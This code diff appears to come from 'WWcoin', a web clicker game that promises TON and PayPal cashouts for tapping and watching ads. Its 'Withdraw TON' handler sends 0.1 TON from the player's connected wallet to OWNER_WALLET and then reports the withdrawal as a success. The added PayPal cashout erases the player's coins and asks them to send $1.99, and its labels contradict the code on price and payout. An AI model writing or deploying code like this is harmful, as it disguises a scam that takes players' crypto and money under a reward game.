@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>WWcoin — Clicker with TON Withdraw</title>
+<title>WWcoin — Clicker with TON Withdraw & PayPal</title>
 
 <script src='//libtl.com/sdk.js' data-zone='10286020' data-sdk='show_10286020'></script>
 <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect.umd.js"></script>
@@ -74,7 +74,7 @@ button.small{padding:8px 10px;border-radius:8px;border:0;cursor:pointer}
       <div id="connectWalletBtn" style="margin-top:12px"></div>
       <div id="walletAddress" class="muted" style="margin-top:6px">Wallet not connected</div>
 
-      <!-- Ad Rewards stays in click screen -->
+      <!-- Ad Rewards -->
       <div style="margin-top:12px">
         <h4 style="margin:6px 0">Ad Rewards</h4>
         <div class="ad-buttons">
@@ -109,13 +109,20 @@ button.small{padding:8px 10px;border-radius:8px;border:0;cursor:pointer}
         <div id="selectedInfo" class="small-muted">Wallet must be connected to withdraw.</div>
         <button id="withdrawBtn" class="small btn-primary" style="margin-top:8px" disabled>Withdraw TON</button>
       </div>
+
+      <!-- PAYPAL CASHOUT -->
+      <div class="withdraw" style="margin-top:16px">
+        <h4>Cashout via PayPal</h4>
+        <input id="paypalEmail" class="select" type="email" placeholder="Enter your PayPal email" />
+        <button id="paypalCashoutBtn" class="small btn-primary" disabled>Cashout 30,000 coins → $1</button>
+        <div id="paypalStatus" class="muted" style="margin-top:6px"></div>
+      </div>
+
       <div style="margin-top:12px; text-align:center">
         <button id="backToClick" class="small btn-primary">Back to Click Game</button>
       </div>
     </aside>
   </div>
-
-  
 </div>
 
 <script>
@@ -148,6 +155,7 @@ const withdrawScreen=document.getElementById('withdrawScreen');
 const goWithdrawBtn=document.getElementById('goWithdrawBtn');
 const backToClick=document.getElementById('backToClick');
 
+// Ad rewards
 const adProgress={'50':0,'100':0,'350':0};
 const adRequirements={'50':3,'100':5,'350':10};
 
@@ -159,19 +167,20 @@ function render(){
   levelEl.textContent=state.level;
   adProgressEl.textContent=`50:${adProgress['50']}/${adRequirements['50']} • 100:${adProgress['100']}/${adRequirements['100']} • 350:${adProgress['350']}/${adRequirements['350']}`;
   updateWithdrawUI();
+  updatePaypalUI();
 }
 
+// Tap & Boost
 function handleTap(){if(state.energy<=0){alert('No energy');return;} state.coins+=state.tapPower*(state.boostActive?2:1); state.energy=Math.max(0,state.energy-1); saveState(); render();}
 function activateBoost(sec=20){if(state.boostActive)return;state.boostActive=true;render();setTimeout(()=>{state.boostActive=false;render();},sec*1000);}
-
 setInterval(()=>{if(state.autoIncome>0)state.coins+=state.autoIncome;state.energy=Math.min(state.maxEnergy,state.energy+0.2);saveState();render();},1000);
 
+// Ads
 function showAd(){return new Promise(resolve=>{if(window.show_10286020 && typeof show_10286020==='function'){try{show_10286020().then(()=>resolve(true));}catch(e){resolve(false);}}else{const ok=confirm('Simulate ad?');setTimeout(()=>resolve(ok),500);}});}
-
 async function watchAd(reward){const req=adRequirements[reward];const watched=await showAd();if(!watched)return;adProgress[reward]++;if(adProgress[reward]>=req){state.coins+=Number(reward);adProgress[reward]=0;alert(`${reward} coin qazandınız!`);}else alert(`Reklama baxıldı (${adProgress[reward]}/${req})`);saveState();render();}
 
+// Withdraw UI
 function updateWithdrawUI(){const needed=Number(convertSelect.value);withdrawBtn.disabled=!(state.tonConnected && state.coins>=needed);selectedInfo.textContent=`Selected: ${needed} coins → Wallet: ${state.tonConnected?state.tonAccount.address:'not connected'}`;}
-
 convertSelect.addEventListener('change',updateWithdrawUI);
 document.getElementById('tapBtn').addEventListener('click',handleTap);
 document.getElementById('refillBtn').addEventListener('click',()=>{state.energy=state.maxEnergy;render();});
@@ -179,20 +188,68 @@ document.getElementById('boostBtn').addEventListener('click',()=>activateBoost(2
 document.getElementById('ad3').addEventListener('click',()=>watchAd('50'));
 document.getElementById('ad5').addEventListener('click',()=>watchAd('100'));
 document.getElementById('ad10').addEventListener('click',()=>watchAd('350'));
-
 goWithdrawBtn.addEventListener('click',()=>{clickScreen.classList.add('hidden');withdrawScreen.classList.remove('hidden');});
 backToClick.addEventListener('click',()=>{withdrawScreen.classList.add('hidden');clickScreen.classList.remove('hidden');});
 
+// TON Connect
 const ui=new TON_CONNECT_UI.TonConnectUI({manifestUrl:MANIFEST_URL,buttonRootId:'connectWalletBtn'});
 ui.onStatusChange(wallet=>{if(wallet){state.tonConnected=true;state.tonAccount=wallet.account;walletAddressEl.textContent="Wallet: "+wallet.account.address;}else{state.tonConnected=false;state.tonAccount=null;walletAddressEl.textContent="Wallet not connected";}updateWithdrawUI();});
 
+// TON Withdraw
 withdrawBtn.addEventListener('click',async()=>{
-  const needed=Number(convertSelect.value);if(state.coins<needed){alert('Not enough coins');return;}if(!state.tonConnected){alert('Connect wallet');return;}
-  const amountNano=String(Math.round(0.1*1_000_000_000)); // simple example
+  const needed=Number(convertSelect.value);
+  if(state.coins<needed){alert('Not enough coins');return;}
+  if(!state.tonConnected){alert('Connect wallet');return;}
+  const amountNano=String(Math.round(0.1*1_000_000_000));
   try{withdrawBtn.disabled=true;withdrawBtn.textContent='Waiting...';await ui.sendTransaction({validUntil:Math.floor(Date.now()/1000)+300,messages:[{address:OWNER_WALLET,amount:amountNano}]});state.coins-=needed;saveState();render();alert(`Success: ${needed} coins sent as TON.`);}catch(err){alert('Tx failed.');}finally{withdrawBtn.textContent='Withdraw TON';updateWithdrawUI();}});
+
+// --- PAYPAL CASHOUT ---
+const PAYPAL_COST = 50000;
+const paypalBtn = document.getElementById('paypalCashoutBtn');
+const paypalEmailInput = document.getElementById('paypalEmail');
+const paypalStatus = document.getElementById('paypalStatus');
+let paypalClaimed = localStorage.getItem('paypal_claimed') === 'yes';
+
+function updatePaypalUI(){
+  if(paypalClaimed){
+    paypalBtn.disabled = true;
+    paypalBtn.textContent = "Already claimed";
+    paypalStatus.textContent = "You already received $1.99";
+    return;
+  }
+
+  if(state.coins >= PAYPAL_COST && paypalEmailInput.value.includes('@')){
+    paypalBtn.disabled = false;
+  }else{
+    paypalBtn.disabled = true;
+  }
+}
+
+paypalEmailInput.addEventListener('input', updatePaypalUI);
+
+paypalBtn.addEventListener('click', ()=>{
+  if(state.coins < PAYPAL_COST){alert(`You need at least ${PAYPAL_COST} coins to cash out $1.99!`);return;}
+  const email = paypalEmailInput.value.trim();
+  if(!email){alert("Enter PayPal email");return;}
+  const confirmSend = confirm(`Send $1.99 MANUALLY to this PayPal email:\n\n${email}\n\nAfter sending, click OK`);
+  if(!confirmSend) return;
+
+  state.coins = 0;
+  saveState();
+  paypalClaimed = true;
+  localStorage.setItem('paypal_claimed','yes');
+
+  paypalBtn.disabled = true;
+  paypalBtn.textContent = "Already claimed";
+  paypalStatus.textContent = "Waiting for manual PayPal transfer.";
+
+  render();
+  alert("Request saved. Please send $1.99 manually via PayPal.");
+});
 
 render();
 </script>
 
 </body>
 </html>
+
